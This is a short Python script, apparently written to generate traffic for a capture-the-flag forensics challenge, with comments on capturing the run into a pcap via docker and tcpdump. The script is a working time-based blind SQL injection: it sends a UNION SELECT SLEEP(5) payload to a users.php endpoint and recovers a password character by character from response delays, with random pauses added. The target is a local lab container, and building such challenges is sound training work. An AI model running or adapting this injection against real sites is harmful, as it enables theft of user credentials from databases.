import requests
import string
import time
import urllib
import random

# Start the containers with
# docker-compose up -d
# then docker exec -it containerid /bin/bash
# apt update && apt install -y tcpdump
# tcpdump -w /var/www/challenge.pcap port 80
# then run this script
# the pcap will then be copied into docker/app/challenge.pcap
# I then used TraceWrangler to replace the IPs with some better looking IPs

payload = """' UNION SELECT SLEEP(5), null FROM users WHERE BINARY SUBSTRING(password, {index}, 1) = "{char}"; --"""

flag = ""
characters = string.ascii_letters + "{}\\//-_" + string.digits

for i in range(1, 30):
    print("Starting new index {}".format(i))
    for char in characters:
        # Add some fake delay
        time.sleep(random.random() / 3)

        start = time.time()
        response = requests.get(
            "http://localhost/users.php?username="
            + urllib.parse.quote_plus(payload.format(index=i, char=char)),
            headers={"Host": "www.securebanking.abc"},
        )

        # print(char, end="")

        # print(char)
        if time.time() - start > 1:
            print(char)
            break
